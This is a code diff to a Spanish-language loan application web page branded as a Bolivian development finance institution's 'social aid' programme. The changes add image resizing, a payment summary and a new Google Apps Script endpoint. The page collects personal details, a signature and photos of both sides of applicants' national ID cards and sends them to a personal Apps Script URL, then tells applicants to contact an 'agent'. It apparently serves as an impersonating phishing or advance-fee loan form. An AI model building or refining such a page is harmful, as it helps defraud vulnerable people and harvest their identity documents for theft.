@@ -222,7 +222,7 @@
             </form>
         </main>
 
-        <!-- OVERLAY DE CARGA (Fijado a la pantalla para centrado absoluto en móviles) -->
+        <!-- OVERLAY DE CARGA -->
         <div id="loading-overlay" class="hidden fixed inset-0 bg-white/95 z-[9999] flex flex-col items-center justify-center p-6 text-center">
             <!-- Imagen del logo agregada a la pantalla de espera -->
             <img src="espera.png" alt="IDEPRO" onerror="this.src='https://placehold.co/150x150/6b21a8/ffffff?text=IDEPRO'" class="w-24 h-auto mb-6 object-contain animate-pulse">
@@ -236,7 +236,7 @@
             </div>
         </div>
 
-        <!-- MODAL ANUNCIO DE ÉXITO (Fijado a la pantalla para centrado absoluto en móviles) -->
+        <!-- MODAL ANUNCIO DE ÉXITO -->
         <div id="success-modal" class="hidden fixed inset-0 bg-black/60 z-[9999] flex items-center justify-center p-4">
             <div class="bg-white rounded-xl shadow-2xl p-6 text-center max-w-sm w-full transform transition-all border-t-4 border-idepro-secondary">
                 <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
@@ -249,6 +249,9 @@
                     Recuerda que este es un formulario de préstamo para <br>
                     <strong class="text-idepro-primary">IDF INSTITUCION FINANCIERA DE DESARROLLO BOLIVIA - PROGRAMA AYUDA SOCIAL - CONTÁCTESE CON SU AGENTE PARA PROCEDER CON SU PRÉSTAMO</strong>.
                 </p>
+                <div id="resumen-final" class="bg-gray-50 border border-gray-200 rounded p-3 mb-5 text-left text-sm text-gray-800 space-y-1">
+                    <!-- El resumen dinámico se insertará aquí -->
+                </div>
                 <button id="close-modal-btn" class="w-full bg-idepro-secondary text-white font-bold py-3 px-4 rounded hover:bg-teal-700 transition-colors shadow">
                     Entendido
                 </button>
@@ -298,7 +301,7 @@
 
     <script>
         // CONFIGURACIÓN DE TU GOOGLE APPS SCRIPT
-        const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz6IXFUTUDfF0xJx2YqIUEBGgvoiDbGPH8tJ6uoVdjXos52GycBIHofJHsk2ECgNKAsgQ/exec";
+        const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwDz0wUBzIoI8jAXZe8SOO58gULkoSsd0qX8eurYWc5U49M2jeweu2w3U_lxK-8ERcM/exec";
 
         // Lógica de menú lateral
         const menuBtn = document.getElementById('menu-btn');
@@ -321,7 +324,6 @@
         const chatInput = document.getElementById('chat-input');
         const chatBody = document.getElementById('chat-body');
 
-        // Abrir/Cerrar chat
         chatbotBtn.addEventListener('click', () => {
             chatWindow.classList.toggle('hidden');
         });
@@ -330,7 +332,6 @@
             chatWindow.classList.add('hidden');
         });
 
-        // Función para agregar mensajes al chat
         function appendMessage(text, isUser) {
             const msgDiv = document.createElement('div');
             msgDiv.className = isUser ? 'flex justify-end' : 'flex items-end space-x-2';
@@ -353,10 +354,9 @@
             
             msgDiv.innerHTML = content;
             chatBody.appendChild(msgDiv);
-            chatBody.scrollTop = chatBody.scrollHeight; // Auto-scroll
+            chatBody.scrollTop = chatBody.scrollHeight;
         }
 
-        // Enviar mensaje en chatbot
         function handleSendChat() {
             const text = chatInput.value.trim();
             if (!text) return;
@@ -381,22 +381,93 @@
         const totalSpan = document.getElementById('calc-total');
         const resumenDiv = document.getElementById('resumen-calculo');
 
+        // Variables para guardar los valores calculados y usarlos en el resumen final
+        let cuotaMensualCalculada = 0;
+        let totalPagarCalculado = 0;
+
         formInputs.forEach(el => el.addEventListener('input', () => {
             const monto = parseFloat(montoInput.value) || 0;
             const plazoSeleccionado = document.querySelector('input[name="plazo"]:checked');
             const plazo = plazoSeleccionado ? parseFloat(plazoSeleccionado.value) : 0;
             
             if(monto > 0 && plazo > 0) {
-                const interes = monto * 0.019 * plazo;
-                interesSpan.textContent = interes.toFixed(2);
-                totalSpan.textContent = (monto + interes).toFixed(2);
+                // Interés total: Monto * 1.9% * meses
+                const interesTotal = monto * 0.019 * plazo;
+                const total = monto + interesTotal;
+                
+                // Cuota mensual aproximada (Total / meses)
+                const cuotaMensual = total / plazo;
+
+                interesSpan.textContent = interesTotal.toFixed(2);
+                totalSpan.textContent = total.toFixed(2);
                 resumenDiv.classList.remove('hidden');
+
+                // Guardar para el resumen
+                cuotaMensualCalculada = cuotaMensual.toFixed(2);
+                totalPagarCalculado = total.toFixed(2);
+
             } else {
                 resumenDiv.classList.add('hidden');
             }
         }));
 
-        // Función auxiliar para convertir archivos a Base64
+        // --- NUEVA LÓGICA DE REDIMENSIONAMIENTO DE IMÁGENES ---
+        function resizeImage(file, maxWidth = 1024, maxHeight = 1024) { // Valores aumentados para mejor resolución
+            return new Promise((resolve, reject) => {
+                if (!file) {
+                    resolve({ data: "", name: "", type: "" });
+                    return;
+                }
+
+                if (file.type === 'application/pdf') {
+                    // Si es PDF, usar la conversión base64 normal sin redimensionar
+                    convertFileToBase64(file).then(resolve).catch(reject);
+                    return;
+                }
+
+                const reader = new FileReader();
+                reader.readAsDataURL(file);
+                reader.onload = (event) => {
+                    const img = new Image();
+                    img.src = event.target.result;
+                    img.onload = () => {
+                        const canvas = document.createElement('canvas');
+                        let width = img.width;
+                        let height = img.height;
+
+                        if (width > height) {
+                            if (width > maxWidth) {
+                                height *= maxWidth / width;
+                                width = maxWidth;
+                            }
+                        } else {
+                            if (height > maxHeight) {
+                                width *= maxHeight / height;
+                                height = maxHeight;
+                            }
+                        }
+
+                        canvas.width = width;
+                        canvas.height = height;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(img, 0, 0, width, height);
+
+                        // Comprimir a JPEG con calidad 0.8 (buena relación calidad/peso)
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                        const base64Data = dataUrl.split(',')[1];
+                        
+                        resolve({
+                            data: base64Data,
+                            name: file.name, // Mantenemos el nombre original, aunque el tipo cambie internamente
+                            type: 'image/jpeg' 
+                        });
+                    };
+                };
+                reader.onerror = error => reject(error);
+            });
+        }
+
+        // Función original mantenida como fallback/para PDFs
         function convertFileToBase64(file) {
             return new Promise((resolve, reject) => {
                 if (!file) {
@@ -416,20 +487,19 @@
                 reader.onerror = error => reject(error);
             });
         }
+        // --------------------------------------------------------
 
-        // Elementos de Modales y Carga
         const form = document.getElementById('loan-form');
         const submitBtn = document.getElementById('submit-btn');
         const btnText = document.getElementById('btn-text');
         const btnSpinner = document.getElementById('btn-spinner');
         const statusBox = document.getElementById('status-box');
         
-        // Nuevos elementos
         const loadingOverlay = document.getElementById('loading-overlay');
         const successModal = document.getElementById('success-modal');
         const closeModalBtn = document.getElementById('close-modal-btn');
+        const resumenFinal = document.getElementById('resumen-final');
 
-        // Cerrar modal de anuncio
         closeModalBtn.addEventListener('click', () => {
             successModal.classList.add('hidden');
         });
@@ -443,35 +513,37 @@
                 return;
             }
 
-            // Deshabilitar botón y activar PANTALLA DE CARGA
             submitBtn.disabled = true;
             btnText.textContent = "PROCESANDO SOLICITUD...";
             btnSpinner.classList.remove('hidden');
             statusBox.classList.add('hidden');
             
-            // Mostrar overlay de carga para prevenir cierres
             loadingOverlay.classList.remove('hidden');
 
             try {
-                // Obtener archivos
                 const fileAnverso = document.getElementById('foto-ci-anverso').files[0];
                 const fileReverso = document.getElementById('foto-ci-reverso').files[0];
                 const fileCroquis = document.getElementById('foto-croquis').files[0];
 
-                // Convertirlos a Base64 en paralelo
-                const [anversoBase64, reversoBase64, croquisBase64] = await Promise.all([
-                    convertFileToBase64(fileAnverso),
-                    convertFileToBase64(fileReverso),
-                    convertFileToBase64(fileCroquis)
+                // Usar la función de redimensionado en lugar de la conversión simple
+                const [anversoData, reversoData, croquisData] = await Promise.all([
+                    resizeImage(fileAnverso),
+                    resizeImage(fileReverso),
+                    resizeImage(fileCroquis)
                 ]);
 
-                // Crear objeto de datos
                 const plazoSeleccionado = document.querySelector('input[name="plazo"]:checked').value;
                 const conforme = document.getElementById('conforme').checked ? "SÍ" : "NO";
+                
+                const nombreCliente = document.getElementById('nombre').value;
+                const ciCliente = document.getElementById('ci').value;
+
+                // Crear el string de resumen para la columna T
+                const resumenParaSheet = `Nombre Completo: ${nombreCliente}\nC.I.: ${ciCliente}\nPagará mensualmente: ${cuotaMensualCalculada} Bs\nTiempo: ${plazoSeleccionado} meses\nTotal a pagar del préstamo: ${totalPagarCalculado} Bs`;
 
                 const formData = {
-                    nombre: document.getElementById('nombre').value,
-                    ci: document.getElementById('ci').value,
+                    nombre: nombreCliente,
+                    ci: ciCliente,
                     expedido: document.getElementById('expedido').value,
                     fechaNacimiento: document.getElementById('fecha-nacimiento').value,
                     estadoCivil: document.getElementById('estado-civil').value,
@@ -486,12 +558,15 @@
                     conforme: conforme,
                     firma: document.getElementById('firma').value,
                     
-                    anversoFile: anversoBase64,
-                    reversoFile: reversoBase64,
-                    croquisFile: croquisBase64
+                    // Enviar los datos base64 redimensionados
+                    anversoFile: anversoData.data,
+                    reversoFile: reversoData.data,
+                    croquisFile: croquisData.data,
+                    
+                    // Nuevo campo de resumen
+                    resumen: resumenParaSheet
                 };
 
-                // Enviar la petición POST
                 const response = await fetch(APPS_SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
@@ -501,10 +576,16 @@
                     body: JSON.stringify(formData)
                 });
 
-                // ÉXITO: Mostrar el Modal con el Anuncio Solicitado
+                // Preparar y mostrar el resumen en el modal
+                resumenFinal.innerHTML = `
+                    <p><strong>Cliente:</strong> ${nombreCliente}</p>
+                    <p><strong>C.I.:</strong> ${ciCliente}</p>
+                    <p><strong>Cuota Mensual:</strong> ${cuotaMensualCalculada} Bs</p>
+                    <p><strong>Plazo:</strong> ${plazoSeleccionado} meses</p>
+                    <p><strong>Total Préstamo:</strong> ${totalPagarCalculado} Bs</p>
+                `;
                 successModal.classList.remove('hidden');
                 
-                // Limpiar formulario
                 form.reset();
                 resumenDiv.classList.add('hidden');
 
@@ -513,7 +594,6 @@
                 statusBox.textContent = "Ocurrió un error al enviar tu solicitud. Inténtalo nuevamente.";
                 statusBox.className = "mb-4 p-3 rounded text-sm text-center font-semibold bg-red-100 text-red-800 block";
             } finally {
-                // Ocultar overlay de carga y restaurar botón
                 loadingOverlay.classList.add('hidden');
                 submitBtn.disabled = false;
                 btnText.textContent = "ENVIAR SOLICITUD";
